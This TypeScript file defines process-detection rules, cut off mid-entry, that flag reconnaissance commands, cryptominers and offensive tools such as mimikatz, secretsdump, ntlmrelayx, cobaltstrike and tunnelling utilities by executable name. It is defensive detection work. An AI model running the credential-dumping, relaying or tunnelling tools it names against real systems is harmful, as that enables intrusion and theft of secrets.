// Match process telemetry, never free-text mentions in application messages.
export type SecurityRule = { id: string, name: string, family: string, severity: 'low' | 'medium' | 'high' | 'critical', explanation: string, pattern: string, field: 'executable' | 'command', positive: string, negative: string }
export const securityRules: SecurityRule[] = [
    {
        'id': 'process.recon.whoami.v1',
        'name': 'whoami reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The whoami command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])whoami(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/whoami',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.id.v1',
        'name': 'id reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'low',
        'explanation': 'The id command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])id(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/id',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.hostname.v1',
        'name': 'hostname reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The hostname command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])hostname(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/hostname',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.uname.v1',
        'name': 'uname reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'low',
        'explanation': 'The uname command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])uname(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/uname',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.uptime.v1',
        'name': 'uptime reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The uptime command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])uptime(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/uptime',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.w.v1',
        'name': 'w reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The w command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])w(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/w',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.who.v1',
        'name': 'who reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The who command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])who(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/who',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.last.v1',
        'name': 'last reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The last command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])last(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/last',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.lastlog.v1',
        'name': 'lastlog reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The lastlog command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])lastlog(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/lastlog',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.groups.v1',
        'name': 'groups reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The groups command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])groups(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/groups',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.getent.v1',
        'name': 'getent reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The getent command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])getent(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/getent',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.env.v1',
        'name': 'env reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The env command listed environment variables without launching another program. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])env(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/env',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.printenv.v1',
        'name': 'printenv reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The printenv command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])printenv(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/printenv',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.ps.v1',
        'name': 'ps reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'low',
        'explanation': 'The ps command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])ps(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/ps',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.pstree.v1',
        'name': 'pstree reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The pstree command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])pstree(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/pstree',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.top.v1',
        'name': 'top reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The top command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])top(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/top',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.ss.v1',
        'name': 'ss reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The ss command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])ss(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/ss',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.netstat.v1',
        'name': 'netstat reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The netstat command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])netstat(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/netstat',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.lsof.v1',
        'name': 'lsof reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The lsof command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])lsof(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/lsof',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.ip.v1',
        'name': 'ip reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The ip command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])ip(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/ip',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.ifconfig.v1',
        'name': 'ifconfig reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The ifconfig command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])ifconfig(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/ifconfig',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.route.v1',
        'name': 'route reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The route command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])route(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/route',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.arp.v1',
        'name': 'arp reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The arp command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])arp(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/arp',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.nslookup.v1',
        'name': 'nslookup reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The nslookup command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])nslookup(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/nslookup',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.dig.v1',
        'name': 'dig reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The dig command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])dig(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/dig',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.host.v1',
        'name': 'host reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The host command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])host(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/host',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.traceroute.v1',
        'name': 'traceroute reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The traceroute command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])traceroute(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/traceroute',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.tracepath.v1',
        'name': 'tracepath reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The tracepath command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])tracepath(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/tracepath',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.systeminfo.v1',
        'name': 'systeminfo reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The systeminfo command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])systeminfo(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/systeminfo',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.tasklist.v1',
        'name': 'tasklist reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The tasklist command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])tasklist(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/tasklist',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.quser.v1',
        'name': 'quser reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The quser command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])quser(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/quser',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.qwinsta.v1',
        'name': 'qwinsta reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The qwinsta command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])qwinsta(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/qwinsta',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.nltest.v1',
        'name': 'nltest reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The nltest command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])nltest(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/nltest',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.dsquery.v1',
        'name': 'dsquery reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The dsquery command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])dsquery(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/dsquery',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.recon.net.v1',
        'name': 'net reconnaissance',
        'family': 'Reconnaissance',
        'severity': 'high',
        'explanation': 'The net command was executed. Review the user and surrounding activity; legitimate administration can also trigger this rule.',
        'pattern': '(?:^|[/\\\\])net(?:\\.exe)?$',
        'field': 'executable',
        'positive': '/usr/bin/net',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.xmrig.v1',
        'name': 'xmrig execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of xmrig requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])xmrig(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/xmrig',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.xmr_stak.v1',
        'name': 'xmr-stak execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of xmr-stak requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])xmr-stak(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/xmr-stak',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.minerd.v1',
        'name': 'minerd execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of minerd requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])minerd(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/minerd',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.cpuminer.v1',
        'name': 'cpuminer execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of cpuminer requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])cpuminer(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/cpuminer',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.kinsing.v1',
        'name': 'kinsing execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of kinsing requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])kinsing(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/kinsing',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.kdevtmpfsi.v1',
        'name': 'kdevtmpfsi execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of kdevtmpfsi requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])kdevtmpfsi(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/kdevtmpfsi',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.masscan.v1',
        'name': 'masscan execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of masscan requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])masscan(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/masscan',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.nmap.v1',
        'name': 'nmap execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of nmap requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])nmap(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/nmap',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.rustscan.v1',
        'name': 'rustscan execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of rustscan requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])rustscan(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/rustscan',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.zmap.v1',
        'name': 'zmap execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of zmap requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])zmap(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/zmap',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.nikto.v1',
        'name': 'nikto execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of nikto requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])nikto(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/nikto',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.sqlmap.v1',
        'name': 'sqlmap execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of sqlmap requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])sqlmap(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/sqlmap',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.hydra.v1',
        'name': 'hydra execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of hydra requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])hydra(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/hydra',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.medusa.v1',
        'name': 'medusa execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of medusa requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])medusa(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/medusa',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.john.v1',
        'name': 'john execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of john requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])john(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/john',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.hashcat.v1',
        'name': 'hashcat execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of hashcat requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])hashcat(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/hashcat',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.mimikatz.v1',
        'name': 'mimikatz execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of mimikatz requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])mimikatz(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/mimikatz',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.secretsdump.v1',
        'name': 'secretsdump execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of secretsdump requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])secretsdump(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/secretsdump',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.pypykatz.v1',
        'name': 'pypykatz execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of pypykatz requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])pypykatz(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/pypykatz',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.bloodhound.v1',
        'name': 'bloodhound execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of bloodhound requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])bloodhound(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/bloodhound',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.sharphound.v1',
        'name': 'sharpHound execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of sharpHound requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])sharpHound(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/sharpHound',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.bloodhound_python.v1',
        'name': 'bloodhound-python execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of bloodhound-python requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])bloodhound-python(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/bloodhound-python',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.crackmapexec.v1',
        'name': 'crackmapexec execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of crackmapexec requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])crackmapexec(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/crackmapexec',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.netexec.v1',
        'name': 'netexec execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of netexec requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])netexec(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/netexec',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.evil_winrm.v1',
        'name': 'evil-winrm execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of evil-winrm requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])evil-winrm(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/evil-winrm',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.responder.v1',
        'name': 'responder execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of responder requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])responder(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/responder',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.ntlmrelayx.v1',
        'name': 'ntlmrelayx execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of ntlmrelayx requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])ntlmrelayx(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/ntlmrelayx',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.mitm6.v1',
        'name': 'mitm6 execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of mitm6 requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])mitm6(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/mitm6',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.kerbrute.v1',
        'name': 'kerbrute execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of kerbrute requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])kerbrute(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/kerbrute',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.rubeus.v1',
        'name': 'rubeus execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of rubeus requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])rubeus(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/rubeus',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.certipy.v1',
        'name': 'certipy execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of certipy requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])certipy(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/certipy',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.certutil.v1',
        'name': 'certutil execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of certutil requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])certutil(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/certutil',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.chisel.v1',
        'name': 'chisel execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of chisel requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])chisel(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/chisel',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.ligolo_ng.v1',
        'name': 'ligolo-ng execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of ligolo-ng requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])ligolo-ng(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/ligolo-ng',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.frpc.v1',
        'name': 'frpc execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of frpc requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])frpc(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/frpc',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.ngrok.v1',
        'name': 'ngrok execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of ngrok requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])ngrok(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/ngrok',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.socat.v1',
        'name': 'socat execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of socat requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])socat(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/socat',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.msfconsole.v1',
        'name': 'msfconsole execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of msfconsole requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])msfconsole(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/msfconsole',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.msfvenom.v1',
        'name': 'msfvenom execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of msfvenom requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])msfvenom(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/msfvenom',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.sliver_client.v1',
        'name': 'sliver-client execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of sliver-client requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])sliver-client(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/sliver-client',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.cobaltstrike.v1',
        'name': 'cobaltstrike execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of cobaltstrike requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])cobaltstrike(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/cobaltstrike',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.linpeas.v1',
        'name': 'linpeas execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of linpeas requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])linpeas(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/linpeas',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.winpeas.v1',
        'name': 'winpeas execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of winpeas requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])winpeas(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/winpeas',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.linux_exploit_suggester.v1',
        'name': 'linux-exploit-suggester execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of linux-exploit-suggester requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])linux-exploit-suggester(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/linux-exploit-suggester',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.enum4linux.v1',
